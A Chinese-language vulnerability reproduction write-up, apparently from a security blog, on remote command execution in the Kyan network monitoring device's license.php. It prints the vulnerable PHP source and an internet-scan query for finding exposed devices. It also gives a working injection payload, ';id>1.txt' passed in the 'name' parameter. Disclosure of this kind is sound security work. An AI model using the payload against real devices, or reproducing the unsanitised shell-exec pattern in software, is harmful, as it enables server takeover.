---
title: "Kyan 网络监控设备 license.php 远程命令执行漏洞"
date: 2026-10-18 09:14:58
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Kyan"
tags:
  - "Kyan"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

Kyan 网络监控设备 license.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞

## 漏洞影响

```
Kyan
```

## 网络测绘

```
app="Kyan设计"
```

## 漏洞复现

登录页面如下

![image-20220519175106605](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191751697.png)

存在漏洞的文件: `/license.php`

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&lt;?php
require_once 'config.php';
require_once 'functions.php';
require_once 'international.php';
session_start();
auth_check();

$BASH = "";
if (is_windows()) {
	$BASH = "c:\\cygwin\\bin\\bash --login -c ";
	$PREFIX = "/cygdrive/z/writable/";
	$PREFIX2 = "/cygdrive/z/";
} else {
	$BASH = "/bin/bashsuid -p -c ";
	$PREFIX = "/config/";
	$PREFIX2 = "/";
}
$encrypt_key = 'enc@leadmeet';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	if (!isset($_FILES['fileupload'])) {
		show_error(lang_get('no file specified'));
		exit;
	}
	if ($_FILES['fileupload']['size'] == 0) {
		show_error(lang_get('file size is zero'));
		exit;
	}
	$fileupload = $_FILES['fileupload'];
	$destdir = $PREFIX . 'licenses';
	$pkg_extract_dir =  $PREFIX2 . 'licenses';
	$tmpname = $fileupload['tmp_name'];
	if (is_windows()) {
		$bn = basename($tmpname);
		$command = "move /Y \"". $tmpname . "\" c:\\cygwin\\dev\\shm\\" . $bn;
		&#115;hell_&#101;xec($command);
		$tmpname = "/dev/shm/" . $bn;
	}
	&#115;hell_&#101;xec($BASH."\"mkdir -p /dev/shm/upload &amp;&amp; chmod -R 777 /dev/shm/ \"");
	&#101;xec($BASH."\"cd /dev/shm/upload &amp;&amp; ( bzcat " . $tmpname . " | openssl bf-cbc -d -k " . $encrypt_key . " | cpio -idu )\"", $output, $ret);
	if($ret &lt;&gt; 0)
	{
		show_error(lang_get('Extract file failed'));
		&#101;xec($BASH."\"rm -rf /dev/shm/upload\"");
		exit;
	}
	&#101;xec($BASH."\"cd /dev/shm/upload &amp;&amp; md5sum -c md5sum\"", $output, $ret);
	if($ret &lt;&gt; 0)
	{
		show_error(lang_get('MD5 check failed'));
		&#101;xec($BASH."\"rm -rf /dev/shm/upload\"");
		exit;
	}
	if (is_windows())
		$dh = opendir('c:\\cygwin\\dev\\shm\\upload');
	else
		$dh = opendir('/dev/shm/upload');
	if(!$dh)
	{
		show_error(lang_get('can not open dest dir to copy'));
		&#101;xec($BASH."\"rm -rf /dev/shm/upload\"");
		exit;
	}
	&#101;xec($BASH."\"touch /tmp/mmap_watch_pause\"");
	while($file = readdir($dh))
	{
		if(is_dir($file)) continue;
		$file = trim($file);
		if(ereg('\.lic$', $file))
		{
			$filetitle = basename($file, '.lic');
			$extract_dir = $pkg_extract_dir  . '/' . $filetitle;
			&#101;xec($BASH."\"" . $extract_dir . "/.init stop\"");
			&#101;xec($BASH."\"mkdir -p " . $destdir . " &amp;&amp; mv -f /dev/shm/upload/" . $file . " " . $destdir . "\"");
			&#101;xec($BASH."\"rm -rf " . $extract_dir . " &amp;&amp; mkdir -p " . $extract_dir . " &amp;&amp; cd " . $extract_dir . " &amp;&amp; bzcat " . $destdir . '/' . $file . " | cpio -idu \"");
		}
	}
	if (!is_windows())
		&#101;xec($BASH."\"/sbin/ldconfig\"");
	else
		&#101;xec($BASH."\"rm -rf ". $tmpname ."\"");
	&#101;xec($BASH."\"rm -f /tmp/mmap_watch_pause\"");
	&#101;xec($BASH."\"rm -rf /dev/shm/upload\"");
}
if (isset(&#36;_GET['cmd']) &amp;&amp; isset(&#36;_GET['name'])) {
	$cmd = &#36;_GET['cmd'];
	if ($cmd == 'delete') {
		$name = &#36;_GET['name'];
		&#101;xec($BASH."\"rm -f ". $PREFIX ."licenses/".$name."\"");
	}
}
print_html_begin('license');
echo "&lt;table style=\"width:500px\"  border='0' align='center' cellpadding='3' cellspacing='1'&gt;\n";
echo "&lt;th colspan=2&gt;".lang_get('licenses')."&lt;/th&gt;\n";
echo "&lt;tr&gt;&lt;td&gt;".lang_get('name')."&lt;/td&gt;&lt;td&gt;".lang_get('operation')."&lt;/td&gt;&lt;/tr&gt;\n";
if (is_windows())
	$dh = opendir('z:\\writable\\licenses');
else
	$dh = opendir('/config/licenses');
if ($dh) {
	while ($file = readdir($dh)) {
		if (is_dir($file))
			continue;
		$file = trim($file);
		if (!ereg('\.lic$', $file))
			continue;
		$filetitle = basename($file, '.lic');
		echo "&lt;tr&gt;&lt;td align=center&gt;".$filetitle."&lt;/td&gt;&lt;td&gt;";
		echo "&lt;/td&gt;&lt;/tr&gt;\n";
	}
}
echo "&lt;/table&gt;\n&lt;br&gt;\n";
echo "&lt;body&gt;\n";
echo "&lt;table style=\"width:500px\"  border='0' align='center' cellpadding='3' cellspacing='1'&gt;\n";
echo "&lt;form action=\"".$_server['php_self']."\" method=\"post\" enctype=\"multipart/form-data\"&gt;\n";
echo "&lt;input type=\"hidden\" name=\"max_file_size\" value=\"200000000\"&gt;\n";
echo "&lt;th align=\"center\" colspan=\"2\"&gt;".lang_get('licenses to upload')."&lt;/th&gt;";
echo "&lt;tr class=\"tablebody1\"&gt; &lt;td align=\"right\" width=\"50%\"&gt;" .lang_get('select file')."&lt;/td&gt;&lt;td align=\"left\"&gt; &lt;input type=\"file\" name=\"fileupload\"&gt; &lt;/td&gt;&lt;/tr&gt;";
echo "&lt;tr class=\"tablebody2\"&gt; &lt;td align=\"center\" colspan=\"2\"&gt;  &lt;input type=\"submit\" name=\"submit\" value=".lang_get('upload')."&gt; &lt;/td&gt;&lt;/tr&gt;";
echo "&lt;/form&gt;\n&lt;/table&gt;\n";
echo "&lt;/body&gt;\n";
print_html_end();
?&gt;</code></pre>

</details>

其中需要注意的位置

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">if (isset(&#36;_GET['cmd']) &amp;&amp; isset(&#36;_GET['name'])) {
	$cmd = &#36;_GET['cmd'];
	if ($cmd == 'delete') {
		$name = &#36;_GET['name'];
		&#101;xec($BASH."\"rm -f ". $PREFIX ."licenses/".$name."\"");
	}
}</code></pre>

</details>

由于变量可控，构造POC执行任意命令

```
/license.php?cmd=delete&name=;id>1.txt
```

![image-20220519174931768](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191749819.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
